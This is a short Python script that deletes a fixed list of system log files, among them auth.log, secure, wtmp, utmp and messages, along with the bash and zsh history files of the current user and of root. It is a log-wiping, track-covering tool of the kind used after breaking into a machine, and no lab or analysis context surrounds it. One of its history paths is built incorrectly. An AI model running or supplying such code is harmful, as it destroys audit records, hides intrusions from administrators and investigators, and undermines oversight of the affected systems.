#!/usr/bin/env python
import os

def deleting_log():
    USER = os.getlogin()
    filepath = ("/var/log/messages", "/var/log/auth.log", "/var/log/kern.log", "/var/log/cron.log", "/var/log/maillog", "/var/log/boot.log", "/var/log/mysqld.log", "/var/log/secure", "/var/log/utmp", "/var/log/wtmp", "/var/log/yum.log", "/var/log/system.log", "/var/log/DiagnosticMessages", "/home/"+USER+"/.zsh_history", "/root/.zsh_history", "/home"+USER+"/.bash_history", "/root/.bash_history")
    for x in filepath:
        try:
            os.remove(x)
            print('[+] Removing :',x)
        except FileNotFoundError:
            print('[-] File Not Found :',x)
deleting_log()